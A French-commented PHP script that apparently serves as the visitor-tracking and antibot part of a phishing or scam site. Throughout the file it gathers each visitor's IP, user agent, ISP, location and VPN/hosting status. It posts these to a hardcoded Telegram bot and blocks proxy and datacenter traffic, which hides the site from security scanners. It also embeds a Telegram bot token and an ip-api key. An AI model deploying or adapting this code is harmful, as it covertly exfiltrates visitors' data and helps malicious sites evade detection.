<?php
// Clé d'API de votre bot Telegram
$telegramApiKey = '6550516522:AAEDzog8OdEJE8z1QUQFZx9bd2hLgnFul3o';

// ID de chat où vous souhaitez envoyer les messages
$chatId = '-4060109585';

// Clé d'API pro de ip-api
$ipApiKey = 'UX5uCXcQ7oWOlxu';


// Fonction pour obtenir l'adresse IP réelle à partir des en-têtes Cloudflare
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

// Fonction pour obtenir les détails de l'adresse IP à l'aide de l'API ip-api
function getIpDetails($ip)
{
    global $ipApiKey;

    $ipApiUrl = "https://pro.ip-api.com/json/{$ip}?fields=status,message,country,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query&key={$ipApiKey}";
    $ipApiResponse = file_get_contents($ipApiUrl);
    return json_decode($ipApiResponse, true);
}

// Fonction pour envoyer un message Telegram avec les détails du visiteur
function sendTelegramMessage($message)
{
    global $telegramApiKey, $chatId;

    $telegramApiUrl = "https://api.telegram.org/bot{$telegramApiKey}/sendMessage";
    $postData = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
    );

    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $response = curl_exec($ch);

    // Check if the API request was successful
    if ($response === false) {
        error_log("Telegram API request failed: " . curl_error($ch));
    }

    curl_close($ch);

    return $response;
}

// Utilisez la fonction pour obtenir l'adresse IP réelle
$visitorIp = getUserIP();

// Obtenez l'agent utilisateur du visiteur
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Obtenez les détails de l'adresse IP
$ipDetails = getIpDetails($visitorIp);

// Construisez le message à envoyer sur Telegram
$message = "[+1] New Visitor 🕵️\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🌐 IP : {$visitorIp}\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🖥️ User Agent : {$userAgent}\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🌍 Pays : {$ipDetails['country']}\n";
$message .= "🕰️ Timezone : {$ipDetails['timezone']} \n";
$message .= "📡 ISP : {$ipDetails['isp']}\n";
$message .= "🏢 Organisation : {$ipDetails['org']}\n";
$message .= "🌐 AS : {$ipDetails['as']} ({$ipDetails['asname']})\n";
$message .= "🔄 Reverse DNS : {$ipDetails['reverse']}\n";
$message .= "📱 Mobile : " . ($ipDetails['mobile'] ? 'Oui' : 'Non') . "\n";
$message .= "🌐 Proxy : " . ($ipDetails['proxy'] ? 'Oui' : 'Non') . "\n";
$message .= "🏠 Hosting : " . ($ipDetails['hosting'] ? 'Oui' : 'Non') . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━\n";

// Vérifiez si l'ISP est banni
if ($ipDetails['proxy'] || $ipDetails['hosting']) {
    // Ajoutez la raison du refus
    $message .= "Status: [🛑] \n";
    $message .= "Please disable your VPN to access this website.\n";

    // Log the refusal message
    error_log("Visitor refused: IP - {$visitorIp}, ISP - {$ipDetails['isp']}");

    // Envoyez le message sur Telegram
    sendTelegramMessage($message);

    // Affichez le message de refus sur la page Web
    die('<script>alert("Please disable your VPN to access this website.");</script>');
} else {
    // Ajoutez la raison de l'acceptation
    $message .= "Status: [✅]\n";

    // Ajoutez les informations spécifiques pour la notification
    $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "TRAFFIC FROM SANDBOX\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━\n";

    // Envoyez le message sur Telegram
    sendTelegramMessage($message);
}
?>
